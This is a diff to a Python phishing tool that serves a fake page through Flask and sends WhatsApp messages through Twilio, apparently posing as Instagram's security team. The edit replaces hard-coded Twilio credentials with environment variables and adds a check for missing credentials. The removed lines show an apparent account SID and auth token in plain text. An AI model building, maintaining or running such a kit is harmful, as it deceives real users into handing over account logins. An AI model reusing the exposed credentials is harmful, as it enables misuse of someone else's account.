@@ -5,10 +5,10 @@ import string
 import time
 import os
 
-# Twilio credentials (read from environment variables if available)
-ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID", "AC8ee16f7d6ee79578c54e6d742a08a491")
-AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN", "101d3a2f7a260be38c7fa365a8f61be5")
-TWILIO_PHONE = "whatsapp:+14155238886"  # Twilio WhatsApp sandbox number
+# Twilio credentials (read from environment variables)
+ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")
+AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")
+TWILIO_PHONE = os.getenv("TWILIO_PHONE")
 
 # Flask app for the fake page
 app = Flask(__name__)
@@ -227,6 +227,10 @@ Instagram Security Team"""
 
 def send_whatsapp_message(target_phone, message):
     """Send the phishing message via WhatsApp using Twilio."""
+    # Check if credentials are available
+    if not ACCOUNT_SID or not AUTH_TOKEN or not TWILIO_PHONE:
+        return False, "Missing Twilio credentials. Please set TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, and TWILIO_PHONE in environment variables."
+    
     client = Client(ACCOUNT_SID, AUTH_TOKEN)
     try:
         print(f"Sending WhatsApp message to {target_phone}...")
